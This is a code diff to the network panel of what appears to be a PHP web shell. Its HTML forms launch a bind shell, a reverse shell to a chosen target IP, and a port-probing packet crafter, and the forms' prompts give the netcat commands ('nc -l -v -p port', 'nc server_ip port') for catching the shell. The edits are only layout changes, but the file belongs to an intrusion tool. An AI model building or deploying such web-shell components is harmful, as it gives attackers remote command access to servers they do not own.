@@ -22,17 +22,17 @@ $GLOBALS['module']['network']['content'] = "
 	<tr><th colspan='2'><p class='boxtitle'>Bind Shell</p></th></tr>
 </thead>
 <tbody>
-	<tr><td style='width:140px'>Server IP</td><td><input type='text' id='bindAddr' value='".$server_addr."' disabled></td></tr>
+	<tr><td style='width:120px'>Server IP</td><td><input type='text' id='bindAddr' value='".$server_addr."' disabled></td></tr>
 	<tr><td>Port</td><td><input type='text' id='bindPort' value='".$default_port."' onkeydown=\"trap_enter(event, 'rs_go_bind');\"></td></tr>
 </tbody>
 <tfoot>
 	<tr>
-		<td style='width:140px;'>
+		<td style='width:120px;'>
 			<select id='bindLang' class='rsType'>
 				<option>php</option>".$winbinary."
 			</select>
 		</td>
-		<td><input type='button' class='button' onclick=\"rs_go_bind();\" value='run'></td>
+		<td><span class='button' onclick=\"rs_go_bind();\" style='width:120px;'>run</span></td>
 	</tr>
 	<tr><td colspan='2'><pre id='bindResult'>Press ' run ' button and run ' nc server_ip port ' on your computer</pre></td></tr>
 </tfoot>
@@ -43,17 +43,17 @@ $GLOBALS['module']['network']['content'] = "
 	<tr><th colspan='2'><p class='boxtitle'>Reverse Shell</p></th></tr>
 </thead>
 <tbody>
-	<tr><td style='width:140px'>Target IP</td><td><input type='text' id='backAddr' value='".$remote_addr."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
+	<tr><td style='width:120px'>Target IP</td><td><input type='text' id='backAddr' value='".$remote_addr."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
 	<tr><td>Port</td><td><input type='text' id='backPort' value='".$default_port."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
 </tbody>
 <tfoot>
 	<tr>
-		<td style='width:140px;'>
+		<td style='width:120px;'>
 			<select id='backLang' class='rsType'>
 				<option>php</option>".$winbinary."
 			</select>
 		</td>
-		<td><input type='button' class='button' onclick=\"rs_go('back');\" value='run'></td>
+		<td><span class='button' onclick=\"rs_go('back');\" style='width:120px;'>run</span></td>
 	</tr>
 	<tr><td colspan='2'><pre id='backResult'>Run ' nc -l -v -p port ' on your computer and press ' run ' button</pre></td></tr>
 </tfoot>
@@ -64,7 +64,7 @@ $GLOBALS['module']['network']['content'] = "
 	<tr><th colspan='2'><p class='boxtitle'>Simple Packet Crafter</p></th></tr>
 </thead>
 <tbody>
-	<tr><td style='width:140px'>Host</td><td><input type='text' id='packetHost' value='tcp://".$server_addr."' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
+	<tr><td style='width:120px'>Host</td><td><input type='text' id='packetHost' value='tcp://".$server_addr."' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
 	<tr><td>Start Port</td><td><input type='text' id='packetStartPort' value='80' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
 	<tr><td>End Port</td><td><input type='text' id='packetEndPort' value='80' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
 	<tr><td>Connection Timeout</td><td><input type='text' id='packetTimeout' value='5' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
@@ -74,7 +74,7 @@ $GLOBALS['module']['network']['content'] = "
 	<tr><td colspan='2'><textarea id='packetContent' style='height:140px;min-height:140px;'>GET / HTTP/1.1\\r\\n\\r\\n</textarea></td></tr>
 	<tr>
 		<td>
-			<input type='button' class='button' onclick=\"packet_go();\" value='run'>
+			<span class='button' onclick=\"packet_go();\" style='width:120px;'>run</span>
 		</td>
 		<td>You can also press ctrl+enter to submit</td>
 	</tr>
